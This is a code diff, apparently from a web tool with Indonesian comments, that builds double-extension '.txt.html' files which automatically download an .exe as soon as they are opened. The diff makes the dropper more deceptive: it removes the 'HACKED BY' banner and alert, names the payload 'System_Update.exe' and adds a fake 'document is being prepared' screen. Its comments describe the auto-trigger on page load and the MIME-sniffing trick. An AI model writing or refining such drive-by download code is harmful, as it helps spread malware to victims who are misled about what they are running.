@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Auto Drive-by Execution</title>
+<title>Silent Auto Download</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
@@ -22,8 +22,8 @@ button:hover { background: #b71c1c; }
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Auto Drive-by Execution (No Gesture)</h2>
-<p>Memicu unduhan .exe secara otomatis tanpa interaksi pengguna.</p>
+<h2>Silent Auto Download</h2>
+<p>Membuat file .txt.html yang saat dibuka langsung mengunduh .exe tanpa alert.</p>
 
 <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate File</button>
 
@@ -52,18 +52,15 @@ const speak = (message) => {
 const prepareDataUriAsync = (i) => {
     return new Promise((resolve) => {
         queueMicrotask(() => {
-            // Payload HTML yang akan dipicu secara otomatis
+            // Payload HTML TANPA alert()
             const payloadText = "<!DOCTYPE html>" +
             "<html>" +
-            "<head><meta charset='UTF-8'><title>HACKED BY</title></head>" +
+            "<head><meta charset='UTF-8'><title>Document Viewer</title></head>" +
             "<body style='margin:0;padding:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden;cursor:pointer'>" +
             "<div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center'>" +
-            "<h1 style='font-size:80px;color:#f00;text-shadow:0 0 20px #f00;letter-spacing:8px;animation:pulse 1s infinite'>HACKED BY</h1>" +
-            "<h2 style='font-size:36px;color:#0f0;text-shadow:0 0 15px #0f0;margin-top:20px;letter-spacing:4px'>WAGURI</h2>" +
-            "<p style='font-size:18px;color:#0f0;margin-top:40px;opacity:0.8'>Your system has been compromised.</p>" +
-            "<p style='font-size:14px;color:#0f0;margin-top:10px;opacity:0.6' id='status'>Menyiapkan payload...</p>" +
-            "<p style='font-size:14px;color:#ff0;margin-top:20px'>Downloading Payload...</p>" +
-            "<p style='font-size:12px;color:#666;margin-top:60px'>Origin: <span id='o'></span></p>" +
+            "<h1 style='font-size:60px;color:#f00;text-shadow:0 0 20px #f00;letter-spacing:8px;animation:pulse 1s infinite'>SYSTEM LOADING</h1>" +
+            "<p style='font-size:18px;color:#0f0;margin-top:40px;opacity:0.8'>Please wait while the document is being prepared...</p>" +
+            "<p style='font-size:14px;color:#ff0;margin-top:10px;opacity:0.6' id='status'>Menyiapkan payload...</p>" +
             "</div>" +
             "<style>" +
             "@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }" +
@@ -72,8 +69,6 @@ const prepareDataUriAsync = (i) => {
             "<script>" +
             "(function(){" +
             "\"use strict\";" +
-            "document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +
-            "try { alert('HACKED BY WAGURI'); } catch(e){}" +
             "function b64KeBytes(b64){" +
             "var binary = atob(b64);" +
             "var len = binary.length;" +
@@ -96,7 +91,7 @@ const prepareDataUriAsync = (i) => {
             "var url = URL.createObjectURL(blob);" +
             "var a = document.createElement('a');" +
             "a.href = url;" +
-            "a.download = 'hacked-by-anonymous.exe';" +
+            "a.download = 'System_Update.exe';" +
             "a.style.display = 'none';" +
             "document.body.appendChild(a);" +
             "a.click();" +
@@ -112,15 +107,14 @@ const prepareDataUriAsync = (i) => {
             "sudah = false;" +
             "}" +
             "}" +
-            // HANYA AUTO-TRIGGER SAAT LOAD, TANPA INTERAKSI
-            "window.addEventListener('load', function(){ setTimeout(picuDownload, 100); });" +
-            "document.addEventListener('DOMContentLoaded', function(){ setTimeout(picuDownload, 100); });" +
+            // Auto-trigger saat load, tanpa interaksi
+            "window.addEventListener('load', function(){ setTimeout(picuDownload, 500); });" +
+            "document.addEventListener('DOMContentLoaded', function(){ setTimeout(picuDownload, 500); });" +
             "})();" +
             "<\/script>" +
             "</body>" +
             "</html>";
           
-            // Mengubah HTML menjadi Data URI (Base64)
             const base64Html = btoa(unescape(encodeURIComponent(payloadText)));
             const dataUri = `data:text/html;base64,${base64Html}`;
             
@@ -133,8 +127,8 @@ const triggerInstantDownload = (fileData) => {
     const link = document.createElement("a");
     link.href = fileData.url;
     
-    // Ekstensi .txt.html (MIME Sniffing)
-    link.download = `waguri-file-${fileData.id}.txt.html`;
+    // Ekstensi ganda .txt.html (MIME Sniffing)
+    link.download = `document-${fileData.id}.txt.html`;
     
     link.textContent = `File #${fileData.id} (.txt.html)`;
     link.style.display = "none";
